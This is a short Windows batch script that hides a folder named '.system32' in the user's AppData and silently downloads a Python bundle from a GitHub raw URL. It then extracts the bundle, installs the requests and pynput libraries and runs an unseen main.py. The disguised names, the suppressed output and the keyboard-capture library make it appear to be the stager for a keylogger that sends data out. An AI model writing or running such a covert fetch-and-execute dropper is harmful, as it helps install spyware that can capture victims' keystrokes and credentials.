@echo off

set folderPath=%APPDATA%\.system32

if not exist "%folderPath%\windows.zip" (
    curl https://raw.githubusercontent.com/faruqer/cheki/refs/heads/main/python-3.12.7.zip -o %folderPath%\windows.zip > NUL 2>&1
)

if not exist "%folderPath%\extracted" (
    mkdir %folderPath%\extracted
    tar -xf %folderPath%\windows.zip -C %folderPath%\extracted
    del %folderPath%\windows.zip
)

%folderPath%\extracted\python.exe pip install requests
%folderPath%\extracted\python.exe pip install pynput
%folderPath%\extracted\python.exe %folderPath%\main.py
